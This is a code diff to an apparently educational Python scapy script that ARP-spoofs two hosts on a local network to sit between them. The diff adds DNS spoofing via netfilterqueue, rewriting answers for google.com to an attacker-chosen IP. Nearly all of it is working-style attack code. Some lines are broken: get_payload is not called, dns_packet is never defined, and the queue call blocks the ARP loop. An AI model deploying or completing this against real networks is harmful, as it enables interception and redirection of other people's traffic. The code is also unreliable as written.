@@ -1,5 +1,7 @@
 from scapy.all import *
-from scapy.all import IP, Ether, ARP, ICMP
+from scapy.all import IP, Ether, ARP, UDP, DNS, DNSRR, DNSQR
+from netfilterqueue import NetfilterQueue
+import os
 
 # to obtain the network adress
 network_addr = get_if_addr(conf.iface).split('.')
@@ -24,10 +26,47 @@ victim1_MAC = MAC_on_network[1]
 victim2_IP = IP_on_network[2]
 victim2_MAC = MAC_on_network[2]
 
-atk_mac = get_if_hwaddr(conf.iface)
+atk_mac = get_if_hwaddr(conf.iface) # to get mac address of hacker (device who run the code)
+
+false_dns_hosts = {
+    b"www.google.com." : "199.16.173.108", 
+    b"google.com." : "199.16.173.108",
+}
+
+def packet_transfer(packet):
+    scapy_packet = IP(packet.get_payload) # transform packet form netfilter to scapy packet
+    if scapy_packet.haslayer(DNSRR): # verif si packet est bien du DNS
+        print("[Before]:", scapy_packet.summary())
+        scapy_packet = modif_packet(scapy_packet)
+        print("[After]:", scapy_packet.summary())
+        packet.set_payload(bytes(scapy_packet)) # set back as a netfilter packet and put it in the queue
+    packet.accept()
+
+def modif_packet(packet):
+    name_questionned = packet[DNSQR].qname
+    if name_questionned not in false_dns_hosts:
+        print("RAS:", name_questionned)
+        return packet
+    packet[DNS].an = DNSRR(rrname=name_questionned, rdata=false_dns_hosts[name_questionned]) # change the information in the packet
+    packet[DNS].ancount = 1
+    del packet[IP].len
+    del packet[IP].chksum
+    del packet[UDP].len
+    del packet[UDP].chksum
+    return packet
+
+
+'''
+MITM et DNS SPOOFING
+'''
+
+queue = NetfilterQueue()
 
 while True:
     spoof_arp_victim2 = Ether(src=atk_mac)/ARP(op=2, pdst=victim2_IP, hwdst=victim2_MAC, psrc=victim1_IP)
     send_spoof2 = sendp(spoof_arp_victim2)
     spoof_arp_victim1 = Ether(src=atk_mac)/ARP(op=2, pdst=victim1_IP, hwdst=victim1_MAC, psrc=victim2_IP)
     send_spoof1 = sendp(spoof_arp_victim1)
+    queue.bind(0, dns_packet)
+    queue.run()
+    packet_transfer(dns_packet)
